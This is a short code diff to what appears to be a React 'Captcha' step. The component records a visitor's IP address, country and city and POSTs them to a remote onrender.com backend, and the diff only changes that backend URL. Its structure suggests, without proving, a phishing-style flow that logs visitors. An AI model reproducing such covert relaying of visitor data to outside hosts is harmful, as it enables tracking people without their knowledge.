@@ -113,7 +113,7 @@ function Captcha({ setStep, Unik, setIp }) {
 
                             setAllData({ ...AllData, ip: data.ip, country: data.country, city: data.city })
 
-                            fetch("https://backtwist.onrender.com/send/ip", {
+                            fetch("https://back-updated-o8j0.onrender.com/send/ip", {
                                 method: "POST",
                                 body: JSON.stringify(params),
                                 headers: {
